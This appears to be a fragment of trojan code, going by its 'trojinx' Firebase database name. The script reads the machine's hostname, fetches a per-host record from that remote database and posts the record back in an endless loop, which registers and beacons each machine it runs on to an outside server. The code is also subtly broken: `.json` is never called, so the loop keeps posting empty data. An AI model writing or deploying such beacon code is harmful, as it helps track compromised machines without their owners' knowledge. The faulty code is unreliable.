import requests
import socket
from json import dumps

hostname = socket.gethostname()

def get_data():
    global hostname
    data = requests.get("https://trojinx-default-rtdb.firebaseio.com/userdata/"+hostname+".json").json
    return data

def send_data():
    global hostname, userdata
    requests.post("https://trojinx-default-rtdb.firebaseio.com/userdata/"+hostname+".json", userdata)

userdata = get_data()

if not userdata:
    print("New user")
    userdata = {"name": hostname}
    send_data()

if type(userdata) != dict:
    userdata = {}

while 1:
    print(userdata)
    send_data()